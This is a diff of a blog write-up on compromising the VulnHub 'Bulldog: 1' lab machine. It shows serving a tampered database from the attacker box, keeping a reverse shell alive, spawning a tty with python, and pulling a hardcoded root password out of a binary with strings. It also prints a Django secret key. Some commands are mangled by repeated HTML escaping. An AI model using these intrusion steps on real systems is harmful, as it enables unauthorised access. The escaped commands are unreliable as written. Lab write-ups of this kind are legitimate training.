@@ -7,6 +7,8 @@ tags:
 - writeup
 - vulnhub
 ---
+
+
 Since I was somewhat bored and hadn't done a vulnerable machine for quite some time I had a look at [vulnhub](https://www.vulnhub.com/) and saw a new machine:
 
 **Bulldog: 1 - [Info & Download](https://www.vulnhub.com/entry/bulldog-1,211/)**
@@ -140,7 +142,7 @@ A secret key :o in settings.py:
 
 ```
 # SECURITY WARNING: keep the secret key used in production secret!
-SECRET_KEY = '%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;amp;u+o_g$yi83d*riq'
+SECRET_KEY = '%9a3ph3iwk$v*_#x4ejg8(t5(qll0fl8q8&amp;amp;amp;amp;amp;amp;amp;amp;u+o_g$yi83d*riq'
 
 ```
 
@@ -180,12 +182,72 @@ https://github.com/xros/py_django_crack
 http://passlib.readthedocs.io/en/stable/lib/passlib.hash.django_std.html
 https://crypto.stackexchange.com/questions/18173/how-long-does-it-take-to-crack-pbkdf2
 https://autohotkey.com/board/topic/108950-pbkdf2-makes-passwords-harder-to-crack/
+
 ```
 
 I decided to take a shortcut, change the admin password and serve the modified database from the attacking machine:
 
 ```
-sqlite3 db.sqlite3 < output.sql
+sqlite3 db.sqlite3 &amp;amp;amp;amp;amp;lt; output.sql
 python -m SimpleHTTPServer 80
+
 ```
 
+Got a somewhat useless(?) admin panel:
+
+![]({{ site.baseurl }}/forestryio/images/2017-10-27%2010_04_01-.png)
+
+I also had some problems spawning a reverse shell, because it immediately died. Finally this little trick did it:
+
+`pwd &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; ./revcat &amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp; sleep 10s`
+
+From a metasploit meterpreter shell (that's just what I'm used too), the following gave me a tty:
+
+`python -c 'import pty; pty.spawn("/bin/bash")'`
+
+Some more digging around the *customPermissionApp*:
+
+```
+cp /home/bulldogadmin/.hiddenadmindirectory/customPermissionApp /home/django/bulldog/
+cd /home/django/bulldog/
+strings customPermissionApp
+/lib64/ld-linux-x86-64.so.2
+[snip]
+GLIBC_2.2.5
+UH-H
+SUPERultH
+imatePASH
+SWORDyouH
+CANTget
+dH34%(
+AWAVA
+AUATL
+[]A\A]A^A_
+Please enter a valid username to use root privileges
+	Usage: ./customPermissionApp &amp;lt;username&amp;gt;
+sudo su root
+;*3$"
+[snip]
+
+```
+
+Wait what was that?? A password?
+
+`¸SUPERultH‰E.H¸imatePASH‰E˜H¸SWORDyouH‰E&amp;nbsp;H¸CANTget.H‰E¨H.U°¸....¹..`
+
+Tried a few combinations and finnally got root:
+
+```
+superultimatepasswordyoucantget
+SUPERULTIMATEPASSWORDYOUCANTGET
+SUPERultimatePASSWORDyouCANTget
+
+```
+
+![]({{ site.baseurl }}/forestryio/images/2017-10-27%2019_15_24-Configuraci%C3%B3n.png)
+
+`Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!`
+
+**Thank you @[frichette_n](https://twitter.com/frichette_n)**
+
+**See ya'll in Bulldog 2!**
